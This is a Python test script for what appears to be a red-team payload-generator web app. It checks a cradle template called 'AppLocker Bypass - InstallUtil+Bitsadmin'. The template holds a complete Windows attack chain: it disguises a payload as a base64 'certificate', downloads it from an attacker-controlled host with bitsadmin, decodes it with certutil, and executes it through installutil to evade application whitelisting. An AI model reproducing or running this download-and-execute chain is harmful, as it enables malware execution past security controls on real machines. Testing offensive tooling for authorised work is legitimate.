#!/usr/bin/env python3
"""
Test realistic AppLocker bypass scenario with command+code
"""
import sys
import tempfile
import os
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from src.web.app import generate_cradle, ps_features

def test_applocker_bypass():
    """Test AppLocker bypass with base64 encoding via command and download cradle via code"""
    print("="*70)
    print("Testing AppLocker Bypass: InstallUtil+Bitsadmin")
    print("="*70)
    
    # Create a temporary test payload
    with tempfile.NamedTemporaryFile(mode='w', suffix='.exe', delete=False) as f:
        f.write('TEST_PAYLOAD_CONTENT')
        test_payload = f.name
    
    output_dir = os.path.dirname(test_payload)
    output_filename = os.path.basename(test_payload)
    
    # Mock AppLocker bypass cradle
    mock_cradle = {
        'name': 'AppLocker Bypass - InstallUtil+Bitsadmin (EXE)',
        'type': 'cradle-exe',
        'no-obf': False,
        'command': '{ echo "-----BEGIN CERTIFICATE-----"; base64 -w 64 {{ output_path }}/{{ output_file }}; echo "-----END CERTIFICATE-----"; } > {{ output_path }}/file.txt',
        'code': 'cmd.exe /c del C:\\Windows\\Tasks\\enc.txt && del c:\\Windows\\Tasks\\a.exe && bitsadmin /Transfer theJob {{ url }}/file.txt C:\\Windows\\Tasks\\enc.txt && certutil -decode C:\\Windows\\Tasks\\enc.txt C:\\Windows\\Tasks\\a.exe && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\a.exe'
    }
    
    ps_features.append(mock_cradle)
    
    try:
        print(f"\nTest payload: {test_payload}")
        print(f"Output dir: {output_dir}")
        
        # Generate the cradle
        result_code, error = generate_cradle(
            cradle_name='AppLocker Bypass - InstallUtil+Bitsadmin (EXE)',
            lhost='192.168.1.100',
            lport=8080,
            output_file=output_filename,
            obf_method='',
            namespace='',
            class_name='',
            entry_point='',
            args='',
            output_path=output_dir
        )
        
        print(f"\n{'='*70}")
        print("COMMAND (executed for side effects):")
        print('-'*70)
        print(f"Creates file.txt with base64-encoded payload")
        
        print(f"\n{'='*70}")
        print("CODE (used as cradle output):")
        print('-'*70)
        print(result_code)
        
        print(f"\n{'='*70}")
        print("VERIFICATION:")
        print('-'*70)
        
        # Check if the command was executed (file.txt created)
        cert_file = os.path.join(output_dir, 'file.txt')
        if os.path.exists(cert_file):
            print(f"✓ Command executed: file.txt created")
            with open(cert_file, 'r') as f:
                content = f.read()
                if '-----BEGIN CERTIFICATE-----' in content and '-----END CERTIFICATE-----' in content:
                    print(f"✓ Certificate format correct")
                    lines = content.split('\n')
                    print(f"  Total lines: {len(lines)}")
                    print(f"  First line: {lines[0]}")
                    print(f"  Last line: {lines[-2] if len(lines) > 2 else lines[-1]}")
            os.remove(cert_file)
        else:
            print(f"✗ Command failed: file.txt not created")
        
        # Check if code field was used as output
        if 'bitsadmin /Transfer theJob' in result_code:
            print(f"✓ Code field used as cradle output")
        else:
            print(f"✗ Code field not used correctly")
        
        # Check variable substitution
        if '{{ url }}' not in result_code and '{{ output_file }}' not in result_code:
            print(f"✓ Variables substituted in code field")
        else:
            print(f"✗ Variables not substituted")
        
        # Check URL construction
        if 'http://192.168.1.100:8080/file.txt' in result_code:
            print(f"✓ URL correctly constructed in code")
        else:
            print(f"⚠ URL construction check failed (expected http://192.168.1.100:8080/file.txt)")
        
        if error:
            print(f"\n⚠ Error returned: {error}")
            
    finally:
        ps_features.remove(mock_cradle)
        if os.path.exists(test_payload):
            os.remove(test_payload)
        cert_file = os.path.join(output_dir, 'file.txt')
        if os.path.exists(cert_file):
            os.remove(cert_file)
    
    print("\n" + "="*70)

if __name__ == '__main__':
    test_applocker_bypass()
    print("Test completed!")
    print("="*70)
